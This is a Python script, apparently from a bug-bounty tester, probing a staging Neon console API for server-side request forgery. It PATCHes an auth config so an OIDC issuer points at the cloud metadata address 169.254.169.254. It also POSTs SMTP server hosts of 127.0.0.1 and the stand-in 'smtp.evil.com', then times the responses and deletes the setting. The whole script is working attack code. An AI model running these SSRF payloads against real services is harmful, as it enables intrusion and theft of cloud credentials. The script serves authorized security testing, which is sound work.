# -*- coding: utf-8 -*-
"""V22b: close SSRF leftovers.
A. PATCH auth/config with oidc/custom provider type -> enum rejection?
B. legacy email_server host -> server-side SMTP connect probe (127.0.0.1:1 fast-fail
   timing vs valid host; host allowlist?)"""
import json, ssl, time, http.client

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def cp(method, path, body=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
        hdrs = {"Content-Type": "application/json", "Authorization": "Bearer " + APIKEY,
                "X-Bug-Bounty": "xxbo", "User-Agent": "Mozilla/5.0"}
        conn.request(method, API_BASE + path, json.dumps(body).encode() if body is not None else None, headers=hdrs)
        t0 = time.time()
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        conn.close()
        return resp.status, data, time.time() - t0
    except Exception as e:
        return None, str(e)[:150], 0


def main():
    out("== V22b SSRF leftovers ==")
    b = "/projects/%s/branches/%s" % (PA, PAMAIN)
    # A. config PATCH provider enum probe (read current first via PATCH-less shape)
    st, d, dt = cp("PATCH", b + "/auth/config", {"oauth_providers": [
        {"type": "oidc", "issuer": "http://169.254.169.254/latest/meta-data/",
         "client_id": "x", "client_secret": "x", "enabled": True}]})
    out("PATCH oidc config -> %d (%.2fs) %s" % (st, dt, d[:250]))
    st, d, dt = cp("PATCH", b + "/auth/config", {"oauth_providers": [
        {"type": "custom", "client_id": "x", "client_secret": "x", "enabled": True}]})
    out("PATCH custom cfg  -> %d (%.2fs) %s" % (st, dt, d[:250]))
    # NOTE: no PATCH github/google - would clobber shared Neon-managed config
    # B. legacy email_server host probe
    for tag, host in [("127.0.0.1:1", "127.0.0.1"), ("smtp.evil.com", "smtp.evil.com")]:
        st, d, dt = cp("POST", "/projects/%s/auth/email_server" % PA,
                       {"host": host, "port": 1, "user": "", "password": "",
                        "secure": False, "sender": "a@b.co"})
        out("%-14s -> %d (%.2fs) %s" % (tag, st, dt, d[:220]))
    # restore legacy email_server empty (delete semantics)
    st, d, dt = cp("DELETE", "/projects/%s/auth/email_server" % PA)
    out("DELETE email_server -> %d (%.2fs) %s" % (st, dt, d[:150]))
    out("done")


if __name__ == "__main__":
    main()
